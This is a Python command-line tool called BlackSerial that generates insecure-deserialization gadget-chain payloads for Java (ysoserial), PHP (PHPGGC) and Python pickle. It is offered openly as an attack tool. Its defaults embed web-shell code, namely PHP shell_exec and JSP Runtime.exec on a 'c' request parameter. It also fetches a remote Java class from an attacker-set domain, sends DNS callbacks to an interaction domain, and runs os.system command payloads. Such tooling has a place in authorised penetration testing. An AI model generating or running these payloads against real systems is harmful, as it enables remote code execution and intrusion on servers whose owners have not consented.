#!/usr/bin/python3

import argparse
import subprocess
import sys
import tempfile
import re
import os
import logging
import base64
from serialiazers import *

class ColorFormatter(logging.Formatter):
    grey = "\x1b[90m"
    yellow = "\x1b[33;20m"
    red = "\x1b[31m"
    reset = "\x1b[0m"
    blue = "\x1b[0;34m"
    green = "\x1b[1;32m"
    bold_red = "\x1b[31;1m"

    FORMATS = {
        logging.DEBUG: f"{blue}[-]{reset} %(message)s",
        logging.INFO: f"{green}[+]{reset} %(message)s",
        logging.WARNING: f"{yellow}[!] %(message)s{reset}",
        logging.ERROR: f"{red}[!] %(message)s{reset}",
        logging.CRITICAL: f"{bold_red}[!] %(message)s{reset}"
    }

    def format(self, record):
        log_fmt = self.FORMATS.get(record.levelno)
        formatter = logging.Formatter(log_fmt)
        return formatter.format(record)


def setupLogging(no_color, verbose):
    logger = logging.getLogger()
    handler = logging.StreamHandler()
    if no_color:
        handler.setFormatter(logging.Formatter('%(levelname)s - %(message)s'))
    else:
        handler.setFormatter(ColorFormatter())
    logger.addHandler(handler)
    if verbose:
        logger.setLevel(logging.DEBUG)
    elif args.out:
        logger.setLevel(logging.INFO)
    else:
        logger.setLevel(logging.ERROR)

def createGenerator(serializer, args):
    if serializer == 'phpggc':
        generator = PHPGGC(args.phpggc_path, args)
    elif serializer == 'ysoserial':
        generator = YSOSerial(args.java_path, args.ysoserial_path, args)
    elif serializer == 'pickle':
        generator = Pickle(args)
    else:
        logging.error(f"Unsupported serializer: {serializer}")
        generator = None
    
    return generator

if __name__ == '__main__':

    title = "BlackSerial"
    description = "Blackbox Gadget Chain Payloads Generator"
    default_system_command = 'nslookup %domain%'
    available_serializers = ['ysoserial', 'phpggc', 'pickle', 'ysoserial.net']

    parser = argparse.ArgumentParser(prog='BlackSerial', description=description, epilog='Author: @darkpills')
    parser.add_argument('chains', help="Specific gadget chain to generate", nargs='*') 
    parser.add_argument('-o', '--out', help="Output payloads to file", default="payloads.txt")
    parser.add_argument('-l', '--list', help="List payloads only", action="store_true")
    parser.add_argument('-s', '--serializer', help="Gadget chain serializer", choices=available_serializers + ['all'], default='ysoserial')
    parser.add_argument('-c', '--system-command', help="System command executed for all chains, %domain% is replaced by --interact-domain parameter", default=default_system_command)
    parser.add_argument('-rf', '--remote-file', help="File path written locally on remote server for 'File Write' type chains, where %ext% is php, jsp, py depending on the gadget chain", default='./blackserial.%ext%')
    parser.add_argument('-rp', '--remote-port', help="Remote port that will be opened on remote server", default='54321')
    parser.add_argument('-i', '--interact-domain', help="Domain for listening to DNS, HTTP callbacks: collaborator, interactsh...")
    parser.add_argument('-u', '--url', help="URL encodes the payload", action="store_true")
    parser.add_argument('-b', '--base64', help="Base64 encode the payload", action="store_true")
    parser.add_argument('-nc', '--no-color', help='No colored output', action="store_true")
    parser.add_argument('-v', '--verbose', help="Verbose mode", action="store_true")

    # php specific
    parser.add_argument('-pg', '--phpggc-path', help="Full path to PHPGGC bin", default="phpggc")
    parser.add_argument('-po', '--phpggc-options', help="Options to pass to PHPGGC command line", default="-f")
    parser.add_argument('-pf', '--php-functions', help="PHP Functions comma-separated list, used for 'RCE: Function Call', 'RCE: PHP Code' and 'File Write'", default='shell_exec')
    parser.add_argument('-pc', '--php-code', help="PHP Code or filepath to a file used for 'RCE: PHP Code' and 'File Write' chains", default="<?php var_dump(%php_function%($_GET['c'])); ?> %chain_id%")

    # java specific
    parser.add_argument('-jp', '--java-path', help="Full path to java bin", default="java")
    parser.add_argument('-jy', '--ysoserial-path', help="Full path to ysoserial jar", default="ysoserial.jar")
    parser.add_argument('-jc', '--jsp-code', help="JSP Code or filepath to a file used for 'File Write' type chains", default="<% Runtime.getRuntime().exec(request.getParameter(\"c\")) %> %chain_id%")
    parser.add_argument('-jr', '--java-remote-class-url', help="URL of the webserver serving a java class for remote dynamic loading. Use it with --java-classname", default="https://%domain%/%chain_id%")
    parser.add_argument('-jl', '--java-classname', help="Java class name used for remote dynamic loading", default="Main")

    # python specific
    parser.add_argument('-yc', '--python-code', help="Python Code or filepath to a file used for 'File Write' type chains", default="raise Exception(os.system('%system_command%'))")
    
    args = parser.parse_args()

    setupLogging(args.no_color, args.verbose)

    logging.info(title)

    if '%domain%' in args.system_command and args.interact_domain == None and args.system_command == default_system_command:
        logging.warning("Defaulting to 'whoami' payload since no interact domain provided")
        args.system_command = 'whoami'
    elif '%domain%' in args.system_command and args.interact_domain == None:
        logging.error(f"No interact domain provided, but %domain% placeholder found in system command: {args.system_command}")
        logging.error(f"Use --interact-domain <mydomain> option")
        sys.exit(-1)
    if str(args.interact_domain) == '':
        logging.warning("No interact domain provided, strongly recommanded for out of band detection")
        logging.warning(f"Use --interact-domain <mydomain> option")
            
    # manage output
    if not args.list:
        f = open(args.out, 'wb') if args.out and args.out != '-' else sys.stdout.buffer

    serializers = available_serializers if args.serializer == 'all' else [args.serializer]
    for serializer in serializers:

        logging.info(f"Using serializer {serializer}")

        # create generator object
        generator = createGenerator(serializer, args)
        if generator == None:
            logging.critical(f'Cannot instanciate serializer: {serializer}')
            sys.exit(-1)

        # make sure generator is available
        logging.debug(f"Checking if all binaries are reachable")
        if not generator.exists():
            logging.critical(f'The program could not be found. Make sure it is installed or in the PATH and all binaries reachable')
            sys.exit(-1)

        # for each php function specified in argument
        logging.info(f"Loading available chains")
        chains = generator.chains()
        logging.info(f"Loaded {len(chains)} chains")

        if args.list:
            for chain in chains:
                print(chain['name'])
            continue
        
        if args.chains:
            finalChains = []
            for paramChain in args.chains:
                found = False
                for chain in chains:
                    if chain['name'] == paramChain:
                        finalChains.append(chain)
                        found = True
                        break
                if not found:
                    logging.error(f'Cannot find gadget chain named "{paramChain}" among {len(chains)} loaded chains!')
                    sys.exit(-1)
        else:
            finalChains = chains

        # generate payloads for each language
        count = generator.generate(finalChains, f)

        logging.info(f"Generated {count} payloads to {args.out}")

    # cleanup
    if not args.list and f is not sys.stdout:
        f.close()

    logging.info(f"Happy hunting!")






    